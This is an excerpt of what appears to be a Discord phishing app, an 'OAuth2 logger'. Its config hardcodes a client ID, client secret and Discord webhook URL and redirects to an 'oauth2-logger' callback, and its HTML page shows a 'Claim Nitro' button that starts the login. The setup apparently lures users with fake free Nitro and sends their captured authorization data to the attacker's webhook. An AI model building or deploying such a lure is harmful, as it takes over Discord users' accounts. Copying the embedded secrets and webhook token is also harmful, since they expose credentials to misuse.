...
# CONFIG
# ═══════════════════════════════════════
CLIENT_ID = os.environ.get("CLIENT_ID", "1541786357028884534")
CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/1541770051777208360/Z1sxSK-tfzhm9d4d77i1rokSDM7kV0eSAXYSKWOiNLG4Z7tpqET2-eDevOgK_cFmRtTG")
REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://oauth2-logger.vercel.app/callback")
...
<body>
    ...
    <a href="/auth" class="claim-btn">Claim Nitro</a>
    <div class="features">
